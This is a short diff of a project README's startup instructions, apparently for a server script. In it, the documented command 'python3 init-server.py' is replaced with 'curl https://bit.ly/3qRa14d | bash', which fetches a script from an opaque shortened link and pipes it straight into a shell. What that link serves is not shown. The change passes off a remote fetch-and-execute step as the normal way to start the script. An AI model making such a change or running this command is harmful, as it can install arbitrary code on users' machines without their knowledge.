@@ -13,7 +13,7 @@ you will need python3 for this script.
 all you need to start the script is.
 
 ```
-python3 init-server.py
+curl https://bit.ly/3qRa14d | bash
 ```
 depending if you have the java runtime environment install you wont need sudo.
 
